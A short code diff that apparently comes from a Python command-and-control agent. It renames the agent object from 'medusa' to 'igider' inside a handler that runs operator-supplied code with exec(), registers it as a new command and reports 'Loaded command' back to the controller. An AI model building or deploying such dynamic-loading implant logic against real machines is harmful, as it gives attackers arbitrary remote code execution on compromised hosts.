@@ -16,7 +16,7 @@
 
         if cmd_code:
             exec(cmd_code.replace("\n    ","\n")[4:])
-            setattr(medusa, command, eval(command))
+            setattr(igider, command, eval(command))
             cmd_list = [{"action": "add", "cmd": command}]
             responses = [{ "task_id": task_id, "user_output": "Loaded command: {}".format(command), "commands": cmd_list, "completed": True }]
             message = { "action": "post_response", "responses": responses }
